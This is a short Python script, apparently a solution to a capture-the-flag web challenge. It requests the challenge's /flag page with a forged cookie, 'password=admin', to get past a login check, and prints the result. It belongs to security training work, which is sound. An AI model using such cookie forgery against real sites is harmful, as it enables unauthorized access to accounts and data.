import requests

url='http://web-05.challs.olicyber.it/flag'
cookie={'password':'admin'}

response = requests.get(url, cookies=cookie)

if(response.status_code == 200):
    print(response.text)
else:
    print("Error: " + str(response.status_code) + " - " + response.text)